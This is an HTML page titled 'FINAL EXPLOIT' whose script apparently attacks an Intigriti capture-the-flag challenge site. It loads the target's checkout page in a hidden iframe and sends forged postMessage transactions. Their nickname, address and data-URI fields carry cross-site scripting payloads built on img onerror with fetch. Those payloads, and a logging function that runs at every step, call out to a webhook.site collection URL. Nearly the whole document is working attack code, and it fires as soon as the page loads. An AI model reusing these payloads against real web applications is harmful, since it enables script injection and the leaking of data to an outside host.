<!DOCTYPE html>
<html>
<head><title>FINAL</title></head>
<body>
<h1>FINAL EXPLOIT</h1>
<div id="log"></div>
<script>
const T = 'https://challenge-0126.intigriti.io';
const W = 'https://webhook.site/8089eff3-ae85-4c51-954d-02c7930883b9';
const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
let s = 0;

function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?step='+s+'&msg='+encodeURIComponent(m); }

async function exploit() {
    log('STARTING');

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
    document.body.appendChild(iframe);

    await new Promise(r => iframe.onload = r);
    await new Promise(r => setTimeout(r, 2000));
    log('Iframe loaded');

    // Approach 1: Try to send with nickname in postMessage (might be reflected)
    log('Try 1: Nickname in extra field...');
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: WALLET,
            currency: '1337COIN',
            amount: 1,
            nickname: '&lt;img src=x onerror=&quot;fetch(\''+W+'/?try1\',{mode:\'no-cors\'})&quot;&gt;'
        }
    }, '*');

    await new Promise(r => setTimeout(r, 1000));

    // Approach 2: Send to many possible wallet addresses (brute force format)
    log('Try 2: Test address formats...');
    const prefixes = ['xss&lt;img src=x onerror=&quot;fetch(\''+W+'/?try2\',{mode:\'no-cors\'})&quot;&gt;', 'test'];
    for(const p of prefixes) {
        try {
            iframe.contentWindow.postMessage({
                type: 'submitTransaction',
                transaction: {toAddress:p,currency:'1337COIN',amount:0}
            }, '*');
        } catch(e){}
    }

    // Approach 3: Use data URI as address
    await new Promise(r => setTimeout(r, 500));
    log('Try 3: Data URI...');
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: 'data:text/html,&lt;img src=x onerror=&quot;fetch(\''+W+'/?try3\',{mode:\'no-cors\'})&quot;&gt;',
            currency: '1337COIN',
            amount: 0
        }
    }, '*');

    await new Promise(r => setTimeout(r, 500));

    // Approach 4: Send to target with amount 0 (might show in marketwatch)
    log('Try 4: Send 0 to target...');
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {toAddress:WALLET,currency:'1337COIN',amount:0}
    }, '*');

    await new Promise(r => setTimeout(r, 2000));
    log('Opening marketwatch...');
    window.open(T+'/marketwatch.html','_blank');
    log('DONE - check webhook for any XSS execution');
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
